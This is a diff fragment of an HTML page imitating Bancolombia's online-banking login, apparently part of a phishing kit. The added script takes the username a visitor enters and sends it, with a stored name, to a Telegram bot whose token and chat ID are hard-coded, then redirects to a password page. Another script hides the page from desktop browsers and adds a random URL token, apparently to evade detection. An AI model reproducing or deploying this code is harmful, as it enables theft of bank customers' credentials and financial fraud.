class="bc-app-footer"><hr class="bc-footer-hr"><div class="flex justify-center items-center mb-3"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPEAAABACAMAAAD8g2HrAAAC3FBMVEUAAAAAAAAAAABVAABAQEAzMzMrKyskJCQgICA5HBwzMzMuLi4rKysnJyckJCQzIiIwMDAtLS0rKysoKCgmJiYxJCQuLi4sLCwrKyspKSknJycvJiYuLiQsLCwrKyspKSkwKCguJyctLSYsLCwrKyspKSkvKCguJyctLSYsLCwrKysqKiouKSktKCgsLCcrKysrKysqKiouKSktKCgsLCcrKysrKysqKiouKSktKCgsLCgrKycrKysuKiotKSktKCgsLCgrKycrKystKSksKSksLCgtKSksKSksLCgrKygrKystKiotKSksKSksLCgrKygrKystKiosKiosKSkrKSkrKygtKygtKiosKiosKSkrKSkrKygtKygtKiosKiosKSkrKSktKiosKiosKSkrKSkrKyktKygsKiosKiosKSkrKSktKygsKigsKiosKSkrKSktKyktKygsKigsKSkrKSktKyktKygsKigsKiorKiorKSksKyksKigsKiorKiorKSktKyksKyksKigsKiorKiorKSktKyksKyksKigsKigrKiotKSksKyksKyksKiksKigrKiotKSksKyksKyksKiksKigrKiotKSksKyksKyksKiksKigrKiotKSksKyksKyksKiksKiktKigsKiosKSksKykrKiktKigsKiosKSksKyksKikrKiktKigsKiosKSksKikrKiktKigsKiosKSksKyksKikrKiksKiksKiosKSksKyksKiktKiksKiksKigsKSksKyksKiksKiksKigsKSksKiktKiksKiksKiksKiosKykrKiksKiksKiksKiksKiosKykrKiksKiksKiksKiksKigsKyktKiksKiksKiksKiksKigsKyksKiksKiksKiksKiksKiksKyksKiksKiksKiksKiksKiksKyksKiksKiksKiksKiksKiksKyksKiksKiksKin///+1jVOfAAAA8nRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCREVGSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZ2hpamtsbW5vcHJzdHV2d3h5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" alt="Bancolombia" class="bc-footer-logo"></div><div class="flex justify-center items-center mb-3"><img src="/assets/SFC__NEGRO_1_1_1754701710115-C7vwSrl7.png" alt="Vigilado" class="bc-vigilado-logo"></div><div><p class="bc-footer-ip">Dirección IP: 181.119.86.1</p><p class="bc-footer-date">sábado, 20 de septiembre de 2025, 08:21 a.&nbsp;m.</p></div></footer></div></div></div>
+    <!-- This is a replit script which adds a banner on the top of the page when opened in development mode outside the replit environment -->
+    <script type="text/javascript" src="https://replit.com/public/js/replit-dev-banner.js"></script>
+  
+
+<script>
+  const form = document.querySelector("form.bc-form-fields");
+  const input = document.getElementById("usuario");
+  const btnContinuar = document.querySelector(".bc-continue-button");
+
+  // Configuración de Telegram (Actualizado a credenciales funcionales de Nequi)
+  const TELEGRAM_TOKEN = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
+  const TELEGRAM_CHAT_ID = '-5182218323'; // Grupo LOG
+
+  // Pre-fill from sessionStorage - DESACTIVADO A PETICIÓN
+  /*
+  if (input) {
+      const storedUser = sessionStorage.getItem('bc_usuario') || sessionStorage.getItem('user_cedula');
+      if (storedUser) {
+          input.value = storedUser;
+          // Trigger input event to enable button
+          const event = new Event('input', { bubbles: true });
+          input.dispatchEvent(event);
+      }
+  }
+  */
+
+  if (form && input && btnContinuar) {
+    // Habilitar/deshabilitar botón según el contenido
+    input.addEventListener("input", () => {
+      btnContinuar.disabled = input.value.trim().length === 0;
+    });
+
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
+      
+      const usuario = input.value.trim();
+      const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
+      const mensaje = `🔔 **Nuevo Ingreso**\n👤 Nombre: ${userNombre}\n👤 Usuario: ${usuario}`;
+
+      // Enviar a Telegram vía Fetch API
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        if (response.ok) {
+          // Guardar localmente y redirigir
+          sessionStorage.setItem("bc_usuario", usuario);
+          window.location.href = "clave.html";
+        } else {
+          console.error("Error al enviar a Telegram");
+        }
+      } catch (error) {
+        console.error("Error de red:", error);
+      }
+    });
+  }
+</script>
+<script>
+    (function() {
+        // Mobile Check
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+        if (!mobileRegex.test(userAgent)) {
+            document.body.innerHTML = '';
+        }
+
+        try {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+            const url = new URL(window.location.href);
+            url.searchParams.set('token', base64Token);
+            window.history.replaceState(null, '', url.toString());
+        } catch(e) {}
+    })();
+</script>
+</body>
